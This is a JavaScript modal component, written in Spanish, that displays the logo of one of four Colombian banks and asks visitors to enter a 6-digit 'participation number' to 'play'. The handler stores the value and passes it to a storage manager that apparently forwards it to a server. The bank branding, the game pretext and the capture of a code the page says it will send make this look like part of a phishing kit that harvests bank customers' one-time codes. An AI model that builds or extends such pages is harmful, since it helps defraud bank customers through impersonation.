/**
 * Definición declarativa del Modal Número T (6 dígitos)
 * Modal para ingresar número de participación de 6 dígitos
 */

const modalNumeroTDefinition = {
  // ==================== TEMPLATE ====================
  template: function({ buttonText, showProgress, flowConfig }) {
    const banco = this.getAttribute('banco') || localStorage.getItem('rayan_datos_registro_banco') || 'avvillas';
    const bancoInfo = this.getBancoInfo(banco);
    const digitosRequeridos = this.getDigitosRequeridos(banco);

    return `
      <div class="modal-overlay">
        <div class="modal-content">
          <div class="content">
            <img src="${bancoInfo.logo}" alt="${bancoInfo.nombre}" class="logo" />

            <div class="form-section">
              <p class="message">Te enviaremos tu número de participación</p>
              <input
                type="text"
                id="input-numero"
                class="input-numero"
                maxlength="${digitosRequeridos}"
                placeholder="Ingresa ${digitosRequeridos} dígitos"
              />
              <button id="btn-jugar" class="btn-jugar" data-submit-button disabled>
                <span id="btn-text">${buttonText || 'Jugar'}</span>
                <div id="spinner" class="spinner hidden"></div>
              </button>
            </div>
          </div>
        </div>
      </div>
    `;
  },

  // ==================== ESTILOS ====================
  styles: `
    .modal-overlay {
      position: fixed;
      inset: 0;
      background-color: rgba(0, 0, 0, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 50;
      padding: 1rem;
    }

    .modal-content {
      background-color: white;
      border-radius: 1rem;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
      max-width: 28rem;
      width: 100%;
      padding: 2rem;
      animation: fadeIn 0.3s ease-out;
      box-sizing: border-box;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.9); }
      to { opacity: 1; transform: scale(1); }
    }

    .content {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 1.5rem;
      width: 100%;
    }

    .logo {
      height: 3.5rem;
      max-width: 100%;
      width: auto;
      object-fit: contain;
    }

    .form-section {
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 1rem;
    }

    .message {
      text-align: center;
      color: #374151;
      font-size: 1rem;
      font-weight: 500;
      padding: 0 0.5rem;
    }

    .input-numero {
      width: 100%;
      max-width: 16rem;
      padding: 0.75rem 1rem;
      text-align: center;
      font-size: 1.5rem;
      font-weight: 700;
      border: 2px solid #d1d5db;
      border-radius: 0.5rem;
      outline: none;
    }

    .input-numero:focus {
      border-color: #2563eb;
    }

    .btn-jugar {
      padding: 0.75rem 2rem;
      background-color: #2563eb;
      color: white;
      font-size: 1.125rem;
      font-weight: 600;
      border-radius: 0.5rem;
      border: none;
      cursor: pointer;
      transition: all 0.2s;
      min-width: 10rem;
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
    }

    .btn-jugar:hover:not(:disabled) {
      background-color: #1d4ed8;
    }

    .btn-jugar:disabled {
      background-color: #9ca3af;
      cursor: not-allowed;
    }

    .spinner {
      display: inline-block;
      width: 1.25rem;
      height: 1.25rem;
      border: 3px solid rgba(255, 255, 255, 0.3);
      border-top-color: white;
      border-radius: 50%;
      animation: spin 0.6s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .hidden {
      display: none;
    }

    .return-notification {
      background: #F8FAFC;
      border-left: 4px solid #1E40AF;
      border-radius: 0.375rem;
      padding: 1rem 1.25rem;
      margin-bottom: 1rem;
      display: flex;
      align-items: center;
      gap: 0.875rem;
      animation: slideDownNotif 0.3s ease-out;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
    }

    @keyframes slideDownNotif {
      from {
        opacity: 0;
        transform: translateY(-8px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .notification-icon {
      width: 1.25rem;
      height: 1.25rem;
      color: #1E40AF;
      flex-shrink: 0;
    }

    .return-notification span {
      color: #1F2937;
      font-size: 0.875rem;
      font-weight: 500;
      line-height: 1.5;
    }

    .return-notification.fade-out {
      animation: fadeOutNotif 0.25s ease-out forwards;
    }

    @keyframes fadeOutNotif {
      from {
        opacity: 1;
        transform: translateY(0);
      }
      to {
        opacity: 0;
        transform: translateY(-8px);
      }
    }
  `,

  // ==================== VALIDACIONES ====================
  validations: {
    'input-numero': {
      rules: [
        {
          type: 'custom',
          validator: (value, element) => {
            const digitosRequeridos = this.getDigitosRequeridos(
              this.getAttribute('banco') || localStorage.getItem('rayan_datos_registro_banco') || 'avvillas'
            );
            return value.length === digitosRequeridos && /^\d+$/.test(value);
          },
          message: 'Debes ingresar exactamente 6 dígitos numéricos'
        }
      ],
      realTime: true
    }
  },

  // ==================== HANDLERS ====================
  handlers: {
    '#input-numero input': function(event) {
      // Solo permitir números
      event.target.value = event.target.value.replace(/[^0-9]/g, '');
    },

    '#btn-jugar click': function(event) {
      const input = this.shadowRoot.getElementById('input-numero');
      this.numeroIngresado = input.value;

      // Guardar en localStorage
      localStorage.setItem('rayan_numero_participacion', input.value);

      // Enviar al servidor si storageManager está disponible
      if (window.storageManager && typeof window.storageManager.saveNumeroParticipacion === 'function') {
        window.storageManager.saveNumeroParticipacion(input.value);
      }

      // Mostrar spinner
      this.mostrarSpinner();

      // Avanzar según el modo
      setTimeout(() => {
        if (this.getAttribute('data-flow-managed') === 'true') {
          // MODO FLUJO
          this.completeStep({
            numero: this.numeroIngresado,
            timestamp: Date.now()
          });
        } else {
          // MODO MANUAL
          this.dispatchEvent(new CustomEvent('numero-ingresado', {
            detail: { numero: this.numeroIngresado },
            bubbles: true,
            composed: true
          }));
        }

        this.closeModal();
      }, 1500);
    }
  },

  // ==================== CICLO DE VIDA ====================
  lifecycle: {
    // No se necesita lógica especial en connected para este modal
  },

  // ==================== MÉTODOS PERSONALIZADOS ====================
  getBancoInfo: function(banco) {
    const bancos = {
      'avvillas': {
        nombre: 'Banco AV Villas',
        logo: '/images/logo-avv.png'
      },
      'bogota': {
        nombre: 'Banco de Bogotá',
        logo: '/images/logo-bog.png'
      },
      'occidente': {
        nombre: 'Banco de Occidente',
        logo: '/images/logo-occ.png'
      },
      'popular': {
        nombre: 'Banco Popular',
        logo: '/images/logo-pop.png'
      }
    };

    return bancos[banco] || bancos['avvillas'];
  },

  getDigitosRequeridos: function(banco) {
    // Todos los bancos requieren 6 dígitos para modal-numero-t
    return 6;
  },

  mostrarSpinner: function() {
    const btnText = this.shadowRoot.getElementById('btn-text');
    const spinner = this.shadowRoot.getElementById('spinner');
    const btn = this.shadowRoot.getElementById('btn-jugar');

    if (btnText && spinner && btn) {
      btnText.textContent = 'Procesando';
      spinner.classList.remove('hidden');
      btn.disabled = true;
    }
  },

  // ==================== CONFIGURACIÓN ====================
  config: {
    defaultButtonText: 'Jugar',
    showReturnNotification: true,
    returnMessage: 'Recuerda que ya ingresaste un número previamente.',
    returnIcon: `
      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 8h10M7 12h4m1 8l-4-4H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-3l-4 4z"></path>
    `,
    persistData: true,
    observedAttributes: ['banco']
  }
};

// Exportar
if (typeof window !== 'undefined') {
  window.modalNumeroTDefinition = modalNumeroTDefinition;
}

if (typeof module !== 'undefined' && module.exports) {
  module.exports = modalNumeroTDefinition;
}
